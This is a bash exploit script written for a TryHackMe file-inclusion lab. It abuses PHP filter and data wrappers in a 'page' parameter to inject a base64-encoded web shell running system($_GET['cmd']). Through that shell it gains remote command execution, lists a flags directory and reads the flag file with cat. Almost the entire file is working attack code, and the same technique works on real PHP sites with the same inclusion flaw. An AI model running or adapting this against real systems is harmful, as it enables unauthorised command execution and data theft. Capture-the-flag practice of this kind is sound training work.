#!/bin/bash

################################################################################
# Script Name: PHP Wrapper Flag Automator
# Author:      mrblue
# Description: This script automates the exploitation of a PHP Filter/Data 
#              wrapper vulnerability. It injects a base64-encoded web shell 
#              to achieve RCE, identifies the randomly named flag file in 
#              the /flags directory, and extracts the THM flag content for
#              the tryhackme room File Inclusion, Path Traversal.
################################################################################

# Target IP from the first argument
TARGET_IP=$1

# Check if IP is provided
if [ -z "$TARGET_IP" ]; then
    echo "Usage: ./exploit.sh <IP_ADDRESS>"
    exit 1
fi

# Configuration
# Base64 encoded payload: <?php system($_GET['cmd']); echo 'Shell done!'; ?>
PAYLOAD="PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+"
WRAPPER="php://filter/convert.base64-decode/resource=data://plain/text,$PAYLOAD"
URL="http://$TARGET_IP/playground.php"

echo "[*] Exploiting PHP Wrapper on $TARGET_IP..."

# Step 1: Find the filename in the 'flags' directory
echo "[*] Searching for flag filename..."
# We use 'ls flags' and look for any .txt file
FLAG_FILE=$(curl -s "$URL?page=$WRAPPER&cmd=ls%20flags" | grep -oE '[a-zA-Z0-9]+\.txt' | head -n 1)

if [ -z "$FLAG_FILE" ]; then
    echo "[!] Error: Could not find the flag file. Check if the 'page' parameter is correct."
    exit 1
fi

echo "[+] Found File: $FLAG_FILE"

# Step 2: Read the flag content
echo "[*] Fetching flag content..."
# We use 'cat' on the discovered filename
FINAL_FLAG=$(curl -s "$URL?page=$WRAPPER&cmd=cat%20flags/$FLAG_FILE" | grep -o "THM{[^}]*}")

if [ -z "$FINAL_FLAG" ]; then
    echo "[!] Error: File found but flag content not found in output."
else
    echo "----------------------------------------------------"
    echo "SUCCESS! Flag found:"
    echo "$FINAL_FLAG"
    echo "----------------------------------------------------"
fi
